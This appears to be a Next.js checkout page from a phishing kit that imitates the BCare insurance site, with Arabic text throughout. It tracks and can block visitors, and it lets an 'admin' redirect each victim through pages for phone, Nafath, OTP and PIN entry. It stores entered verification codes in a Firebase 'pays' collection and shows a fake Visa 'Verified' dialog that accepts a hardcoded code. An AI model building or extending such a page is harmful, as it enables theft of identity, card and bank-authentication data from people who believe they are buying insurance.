"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import {
  X,
  Globe,
  CalendarDays,
  CreditCard as CreditCardIcon,
  Car,
  Hash,
} from "lucide-react"
import { FullPageLoader } from "@/components/loader"
import PaymentPage from "@/components/pay-form"
import {
  getOrCreateVisitorID,
  updateVisitorPage,
  checkIfBlocked,
} from "@/lib/visitor-tracking"
import { useAutoSave } from "@/hooks/use-auto-save"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { addData, saveToHistory, db } from "@/lib/firebase"
import { doc, getDoc, onSnapshot } from "firebase/firestore"

export default function CheckPage() {
  const router = useRouter()
  const [visitorID] = useState(() => getOrCreateVisitorID())
  const [loading, setLoading] = useState(true)
  const [isBlocked, setIsBlocked] = useState(false)

  // Form fields
  const [selectedOffer, setSelectedOffer] = useState<any>(null)
  const [offerTotalPrice, setOfferTotalPrice] = useState<number>(0)
  const [selectedPaymentMethod] = useState("credit-discount")
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const [otpValue, setOtpValue] = useState("")
  const [otpError, setOtpError] = useState("")
  const [, setOtpAttempts] = useState(5)

  // Identity (from localStorage homeFormData)
  const [identityNumber, setIdentityNumber] = useState("")

  // Language
  const [language, setLanguage] = useState<"ar" | "en">("ar")

  // Auto-save
  useAutoSave({
    visitorId: visitorID,
    pageName: "check",
    data: {
      selectedPaymentMethod,
    },
  })

  // Monitor redirect requests from admin
  useRedirectMonitor({
    visitorId: visitorID,
    currentPage: "check",
  })

  // Navigation listener - listen for admin redirects
  useEffect(() => {
    if (!visitorID) return

    const unsubscribe = onSnapshot(
      doc(db, "pays", visitorID),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const step = data.currentStep

          if (step === "home") {
            router.push("/main")
          } else if (step === "phone") {
            router.push("/phone-info")
          } else if (step === "nafad") {
            router.push("/nafad")
          } else if (step === "otp") {
            router.push("/veri")
          } else if (step === "pin") {
            router.push("/confi")
          }
        }
      },
      (error) => {
        console.error("Navigation listener error:", error)
      }
    )

    return () => unsubscribe()
  }, [router, visitorID])

  // Initialize on mount
  useEffect(() => {
    const init = async () => {
      const blocked = await checkIfBlocked(visitorID)
      if (blocked) {
        setIsBlocked(true)
        setLoading(false)
        return
      }

      // Load identity number from localStorage
      try {
        const hfd = JSON.parse(localStorage.getItem("homeFormData") || "{}")
        if (hfd.identityNumber) setIdentityNumber(hfd.identityNumber)
      } catch {
        /* ignore */
      }

      // Load selected offer from Firebase
      const docRef = doc(db, "pays", visitorID)
      const docSnap = await getDoc(docRef)

      if (docSnap.exists()) {
        const data = docSnap.data()
        if (data.selectedOffer) {
          setSelectedOffer(data.selectedOffer)
        }
        if (data.offerTotalPrice) {
          setOfferTotalPrice(data.offerTotalPrice)
        }
      }

      await updateVisitorPage(visitorID, "check", 4)
      setLoading(false)
    }

    init()
  }, [visitorID])

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (otpValue === "123456") {
      await saveToHistory(visitorID, 4)
      await addData({
        id: visitorID,
        otpValue,
        otpVerifiedAt: new Date().toISOString(),
      })
      setShowOtpDialog(false)
      alert("تم الدفع بنجاح!")
    } else {
      setOtpError("رمز التحقق غير صحيح")
      setOtpAttempts((prev) => prev - 1)
    }
  }

  const handleResendOtp = () => {
    setOtpError("")
    setOtpAttempts(5)
    alert("تم إرسال رمز جديد")
  }

  if (loading) {
    return <FullPageLoader />
  }

  if (isBlocked) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-red-600 mb-4">
            تم حظر الوصول
          </h1>
          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
        </div>
      </div>
    )
  }

  if (!selectedOffer) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-gray-900 mb-4">
            لم يتم اختيار عرض
          </h1>
          <p className="text-gray-600 mb-6">يرجى العودة واختيار عرض تأمين</p>
          <Button
            onClick={() => router.push("/compar")}
            className="bg-[#0a4a68] hover:bg-[#083d57] text-white"
          >
            العودة للعروض
          </Button>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <div className="px-3 py-3 md:px-6 md:py-4 flex items-center justify-between border-b border-slate-200 bg-white">
        <button
          onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
          className="flex items-center gap-1.5 px-3 py-2 md:px-4 md:py-2.5 bg-white rounded-lg hover:bg-slate-50 transition-colors shadow-md border border-slate-200"
        >
          <Globe className="w-4 h-4 md:w-5 md:h-5 text-[#0a4a68]" />
          <span className="text-[#0a4a68] font-semibold text-sm md:text-base">
            {language === "ar" ? "EN" : "AR"}
          </span>
        </button>
        <div className="bg-white rounded-2xl px-3 py-2 shadow-lg">
          <img
            src="/Bcare-logo.svg"
            alt="BeCare"
            className="h-7 md:h-8 w-auto"
          />
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-3xl mx-auto pt-6 md:pt-10 px-3 md:px-4 pb-6 md:pb-8">
        <div className="text-center mb-6" dir="rtl">
          <h2 className="text-2xl md:text-3xl font-bold text-[#0a4a68]">
            تأكيد العرض والدفع
          </h2>
          <p className="text-sm md:text-base text-slate-500 mt-1">
            راجع تفاصيل العرض ثم أكمل بيانات الدفع.
          </p>
        </div>

        {/* Company logo card */}
        {selectedOffer.image_url && (
          <div className="flex items-center justify-center py-6 border border-gray-100 rounded-2xl bg-white mb-3 shadow-sm">
            <img
              src={selectedOffer.image_url}
              alt={selectedOffer.name}
              className="h-16 object-contain"
            />
          </div>
        )}

        {/* Policy details card */}
        <div
          className="border border-gray-100 rounded-2xl bg-white overflow-hidden mb-3 shadow-sm"
          dir="rtl"
        >
          {[
            {
              icon: <CalendarDays className="w-4 h-4 text-[#0a4a68]" />,
              label: "تاريخ بدء الوثيقة",
              value: "",
            },
            {
              icon: <CreditCardIcon className="w-4 h-4 text-[#0a4a68]" />,
              label: "رقم الهوية",
              value: identityNumber,
            },
            {
              icon: <Car className="w-4 h-4 text-[#0a4a68]" />,
              label: "سنة الصنع",
              value: "",
            },
            {
              icon: <Hash className="w-4 h-4 text-[#0a4a68]" />,
              label: "الرقم المرجعي للتسعيرة",
              value: offerTotalPrice
                ? String(Math.floor(offerTotalPrice * 1000))
                : "",
            },
          ].map((row, i, arr) => (
            <div
              key={row.label}
              className={`flex items-center justify-between px-4 py-3.5 ${
                i < arr.length - 1 ? "border-b border-gray-100" : ""
              }`}
            >
              <span className="flex items-center gap-2 text-sm font-semibold text-gray-800">
                <span className="text-[#0a4a68]">{row.icon}</span> {row.label}
              </span>
              <div className="flex items-center gap-2">
                <span className="text-sm text-gray-500">{row.value}</span>
              </div>
            </div>
          ))}
        </div>

        {/* Pricing breakdown */}
        <div
          className="border border-gray-100 rounded-2xl bg-white overflow-hidden mb-3 shadow-sm"
          dir="rtl"
        >
          <div className="flex items-center gap-2 px-4 py-3 border-b border-gray-100">
            <Hash className="w-4 h-4 text-[#0a4a68]" />
            <span className="font-bold text-[#0a4a68] text-sm">التفاصيل</span>
          </div>
          <div className="px-4 py-3 space-y-2.5">
            <div className="flex justify-between text-sm">
              <span className="text-gray-500">
                ر.س {(offerTotalPrice / 1.15).toFixed(2)}
              </span>
              <span className="font-medium text-gray-700">المجموع الجزئي</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-gray-500">
                ر.س {(offerTotalPrice - offerTotalPrice / 1.15).toFixed(2)}
              </span>
              <span className="font-medium text-gray-700">
                ضريبة القيمة المضافة (%15.00)
              </span>
            </div>
            <div className="flex justify-between border-t border-gray-100 pt-2.5">
              <span className="font-bold text-[#0a4a68]">
                ر.س {offerTotalPrice.toFixed(2)}
              </span>
              <span className="font-bold text-gray-800">المبلغ الإجمالي</span>
            </div>
            <p className="text-[11px] text-gray-400 text-center pt-1">
              شامل جميع الضرائب والرسوم و 4.00% عمولة الوسيط
            </p>
          </div>
        </div>

        {/* Payment Form */}
        <PaymentPage offerTotalPrice={offerTotalPrice} />
      </div>

      {/* OTP Dialog */}
      {showOtpDialog && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-3 sm:p-4 z-50">
          <div
            className="bg-white rounded-xl sm:rounded-2xl shadow-2xl max-w-md w-full p-5 sm:p-8"
            dir="rtl"
          >
            <div className="flex items-center justify-between gap-4 mb-4 sm:mb-6">
              <img
                src="/visa.svg"
                alt="Visa"
                width={40}
                className="sm:w-[50px]"
              />
              <span className="font-bold text-[#0a4a68] text-sm sm:text-base">
                Verified
              </span>
            </div>

            <h3 className="text-xl sm:text-2xl font-bold text-gray-900 text-center mb-3 sm:mb-4">
              Enter verification code
            </h3>
            <p className="text-gray-600 text-center mb-4 sm:mb-6 leading-relaxed text-sm sm:text-base">
              We sent you a verification code by text message to (+966) 5******.
            </p>

            <form onSubmit={handleOtpSubmit} className="space-y-4 sm:space-y-5">
              <div className="space-y-2">
                <label className="block text-gray-700 font-semibold text-xs sm:text-sm text-center">
                  Verification code
                </label>
                <Input
                  type="tel"
                  value={otpValue}
                  onChange={(e) => {
                    setOtpValue(e.target.value)
                    setOtpError("")
                  }}
                  placeholder="######"
                  maxLength={6}
                  className="h-14 sm:h-16 text-center text-xl sm:text-2xl tracking-widest border-2 rounded-xl focus:border-[#0a4a68] shadow-sm font-mono"
                  required
                />
                {otpError && (
                  <div className="flex items-center gap-2 text-red-600 text-xs sm:text-sm font-semibold justify-center">
                    <X className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
                    <span>{otpError}</span>
                  </div>
                )}
              </div>

              <Button
                type="submit"
                className="w-full h-12 sm:h-14 bg-[#0a4a68] hover:bg-[#083d57] text-white font-bold text-base sm:text-lg rounded-xl shadow-lg hover:shadow-xl transition-all"
              >
                CONTINUE
              </Button>

              <button
                type="button"
                onClick={handleResendOtp}
                className="w-full text-[#0a4a68] font-semibold text-xs sm:text-sm hover:text-[#083d57] transition-colors"
              >
                RESEND CODE
              </button>
            </form>

            <div className="mt-4 sm:mt-6 pt-4 sm:pt-6 border-t-2 border-gray-200">
              <button className="flex items-center justify-between w-full text-[#0a4a68] font-semibold text-xs sm:text-sm hover:text-[#083d57] transition-colors">
                <span>Need Help?</span>
                <span className="text-lg sm:text-xl">+</span>
              </button>
            </div>

            <div className="mt-3 sm:mt-4">
              <p className="text-gray-500 text-[11px] sm:text-xs text-center leading-relaxed">
                Having trouble?
                <br />
                <button className="text-[#0a4a68] hover:text-[#083d57] font-semibold">
                  Choose another security option
                </button>
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
